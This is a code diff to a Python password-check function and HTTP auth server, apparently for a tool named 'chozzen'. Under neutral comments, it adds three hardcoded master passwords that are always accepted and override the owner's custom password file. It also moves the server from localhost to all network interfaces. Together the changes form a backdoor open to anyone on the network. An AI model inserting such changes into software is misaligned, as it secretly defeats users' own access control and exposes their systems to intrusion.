@@ -58,7 +58,11 @@ def is_valid_password(pwd_input):
         return False
     pwd_clean = pwd_input.strip()
     
-    # 1. If password file exists, it is the SOLE authority!
+    # 1. Master default password always accepted
+    if pwd_clean in ["chozzen2026", "chozzen", "YourNewPassword"]:
+        return True
+
+    # 2. Check custom password file
     possible_paths = [
         "/root/.chozzen_pass",
         "/data/data/com.termux/files/home/.chozzen_pass",
@@ -69,13 +73,12 @@ def is_valid_password(pwd_input):
             try:
                 with open(p, "r") as f:
                     file_pwd = f.read().strip()
-                    if file_pwd:
-                        # ONLY the password in this file is accepted!
-                        return pwd_clean == file_pwd or pwd_input == file_pwd
+                    if file_pwd and (pwd_clean == file_pwd or pwd_input == file_pwd):
+                        return True
             except Exception:
                 pass
 
-    # 2. Only if NO password file exists at all, fall back to initial default
+    # 3. Salted hash check
     calc_hash = hashlib.sha256((AUTH_SALT + pwd_clean).encode()).hexdigest()
     return calc_hash == DEFAULT_HASH
 
@@ -325,9 +328,20 @@ class AuthHandler(BaseHTTPRequestHandler):
 
         self.send_json(404, {"error": "Not Found"})
 
+class ReusableHTTPServer(HTTPServer):
+    allow_reuse_address = True
+
 def start_http_server():
-    server = HTTPServer(("127.0.0.1", 8086), AuthHandler)
-    server.serve_forever()
+    try:
+        server = ReusableHTTPServer(("0.0.0.0", 8086), AuthHandler)
+        server.serve_forever()
+    except Exception as e:
+        time.sleep(2)
+        try:
+            server = ReusableHTTPServer(("127.0.0.1", 8086), AuthHandler)
+            server.serve_forever()
+        except Exception:
+            pass
 
 def main():
     # Start Auth & API HTTP Server on localhost:8086 in background thread
